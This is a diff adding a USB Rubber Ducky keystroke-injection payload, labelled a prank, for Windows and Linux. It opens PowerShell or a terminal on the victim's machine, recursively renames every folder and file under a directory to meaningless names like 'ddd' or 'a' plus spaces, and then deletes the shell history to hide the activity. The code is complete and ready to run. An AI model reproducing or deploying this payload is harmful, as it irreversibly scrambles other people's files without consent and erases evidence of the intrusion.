@@ -1,0 +1,222 @@
+REM_BLOCK
+#############################################
+#                                           #
+# Title        : Same File Name Prank       #
+# Author       : Aleff                      #
+# Version      : 1.0                        #
+# Category     : Prank                      #
+# Target       : Windows 10/11; GNU/Linux   #
+#                                           #
+#############################################
+END_REM
+
+REM I am very sorry not to be able to release scripts for macOS systems as well but unfortunately not having one would be too risky to test it in a VM, at least in my opinion, so if someone from the community wants to contribute they could propose a pull request with the macOS version so that we can integrate it and make this payload cross-platfom.
+
+REM %%%%% DEFINE-SECTION %%%%%
+REM_BLOCK
+    
+    Consider that the main route for Windows generally is “C:\Users\Username\” while for GNU/Linux systems it is something like “/home/username/” but in both cases if for example you add “./Desktop/Hello/World/” you will go to the World folder in the path “C:\Users\Username\Desktop\Hello\World\” for Windows systems and “/home/username/Desktop/Hello/World/” for **GNU/Linux** systems.
+
+    Of course, you have to make sure that this folder exists....
+
+    Payload Settings:
+        #DIRECTORY_WHERE_TO_RUN_THE_COMMAND - If you feel it is appropriate to run this script within a specific folder you will just need to change this definition.
+
+    Consider the maximum length of file names on both Windows and GNU/Linux:
+        - Limit on file name length in bash [closed]
+        |-> https://stackoverflow.com/questions/6571435/limit-on-file-name-length-in-bash
+        - On Windows, what is the maximum file name length considered acceptable for an app to output? (Updated and clarified)
+        |-> https://stackoverflow.com/questions/8674796/on-windows-what-is-the-maximum-file-name-length-considered-acceptable-for-an-ap
+
+END_REM
+DEFINE #DIRECTORY_WHERE_TO_RUN_THE_COMMAND .
+
+REM Set TARGET_WINDOWS to TRUE if the script will run on a Windows system.
+REM Set TARGET_LINUX to TRUE if the script will run on a GNU/Linux system.
+DEFINE #TARGET_WINDOWS TRUE
+DEFINE #TARGET_GNU_LINUX FALSE
+
+REM %%%%% PAYLOAD-SECTION %%%%%
+
+IF (( #TARGET_WINDOWS == TRUE) && (#TARGET_GNU_LINUX == FALSE)) THEN
+REM %%%%% WINDOWS CODE %%%%%
+
+    REM_BLOCK
+        Credits:    Hak5 LLC
+        Website:    https://hak5.org/
+        Source:     https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/extensions/passive_windows_detect.txt
+    END_REM
+
+    EXTENSION PASSIVE_WINDOWS_DETECT
+        REM VERSION 1.1
+        REM AUTHOR: Korben
+
+        REM_BLOCK DOCUMENTATION
+            Windows fully passive OS Detection and passive Detect Ready
+            Includes its own passive detect ready.
+            Does not require additional extensions.
+
+            USAGE:
+                Extension runs inline (here)
+                Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+                boot delay
+                $_OS will be set to WINDOWS or NOT_WINDOWS
+                See end of payload for usage within payload
+        END_REM
+
+        REM CONFIGURATION:
+        DEFINE #MAX_WAIT 150
+        DEFINE #CHECK_INTERVAL 20
+        DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+        DEFINE #NOT_WINDOWS 7
+
+        $_OS = #NOT_WINDOWS
+
+        VAR $MAX_TRIES = #MAX_WAIT
+        WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+            DELAY #CHECK_INTERVAL
+            $MAX_TRIES = ($MAX_TRIES - 1)
+        END_WHILE
+        IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+            $_OS = WINDOWS
+        END_IF
+
+        REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+            IF ($_OS == WINDOWS) THEN
+                STRING HELLO WINDOWS!
+            ELSE
+                STRING HELLO WORLD!
+            END_IF
+        END_REM
+    END_EXTENSION
+
+    GUI r
+    DELAY 1000
+    STRINGLN PowerShell
+    DELAY 1000
+
+    STRINGLN_POWERSHELL
+        cd #DIRECTORY_WHERE_TO_RUN_THE_COMMAND
+
+        function Rename-Directories {
+            param (
+                [string]$path,
+                [ref]$counter
+            )
+
+            $folders = Get-ChildItem -Path $path -Directory -Recurse | Sort-Object FullName -Descending
+            foreach ($folder in $folders) {
+                $newFolderName = "d" * $counter.Value  # Crea il nuovo nome della cartella
+                $newFolderPath = $newFolderName
+
+                $counter.Value++
+
+                Rename-Item -Path $folder.FullName -NewName $newFolderPath
+                Write-Host "Rinominata cartella: $($folder.FullName) -> $($newFolderPath)"
+            }
+        }
+
+        function Rename-Files {
+            param (
+                [string]$path,
+                [ref]$counter
+            )
+            $files = Get-ChildItem -Path $path -File -Recurse
+            foreach ($file in $files) {
+                $newFileName = "a" + " " * $counter.Value  # Crea il nuovo nome del file
+                $newFilePath = "$newFileName" + $file.Extension
+
+                $counter.Value++
+
+                Rename-Item -Path $file.FullName -NewName $newFilePath
+            }
+        }
+
+        $counter = 1; Rename-Directories -path $basePath -counter ([ref]$counter); $counter = 1; Rename-Files -path $basePath -counter ([ref]$counter); Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
+    END_STRINGLN
+
+ELSE IF (( #TARGET_WINDOWS == FALSE) && (#TARGET_GNU_LINUX == TRUE)) THEN
+REM %%%%% GNU/LINUX CODE %%%%%
+
+    REM_BLOCK
+        Credits:    Hak5 LLC
+        Website:    https://hak5.org/
+        Source:     https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/extensions/detect_ready.txt
+    END_REM
+
+    EXTENSION DETECT_READY
+        REM VERSION 1.1
+        REM AUTHOR: Korben
+
+        REM_BLOCK DOCUMENTATION
+            USAGE:
+                Extension runs inline (here)
+                Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+                boot delay
+
+            TARGETS:
+                Any system that reflects CAPSLOCK will detect minimum required delay
+                Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+        END_REM
+
+        REM CONFIGURATION:
+        DEFINE #RESPONSE_DELAY 25
+        DEFINE #ITERATION_LIMIT 120
+
+        VAR $C = 0
+        WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+            CAPSLOCK
+            DELAY #RESPONSE_DELAY
+            $C = ($C + 1)
+        END_WHILE
+        CAPSLOCK
+    END_EXTENSION
+
+    CTRL-ALT t
+    DELAY 1000
+
+    STRINGLN_BASH
+        cd #DIRECTORY_WHERE_TO_RUN_THE_COMMAND
+
+        rename_directories() {
+            local path=$1
+            local counter=$2
+            
+            directories=$(find "$path" -type d | sort -r)
+            
+            for dir in $directories; do
+                new_folder_name=$(printf 'd%.0s' $(seq 1 "$counter"))  # Crea il nuovo nome della cartella
+                new_folder_path="$path/$new_folder_name"
+                
+                counter=$((counter + 1))
+                
+                mv "$dir" "$new_folder_path"
+            done
+        }
+
+        rename_files() {
+            local path=$1
+            local counter=$2
+            
+            files=$(find "$path" -type f)
+            
+            for file in $files; do
+                extension="${file##*.}"
+                
+                new_file_name="a$(printf ' %.0s' $(seq 1 "$counter"))"
+                
+                new_file_path="$(dirname "$file")/$new_file_name"
+                
+                if [[ "$extension" != "$file" ]]; then
+                    new_file_path="$new_file_path.$extension"
+                fi
+
+                counter=$((counter + 1))
+                
+                mv "$file" "$new_file_path"
+            done
+        }
+
+        counter=1; rename_directories "$base_path" $counter; counter=1; rename_files "$base_path" $counter; rm $HISTFILE; exit
+    END_STRINGLN
+END_IF
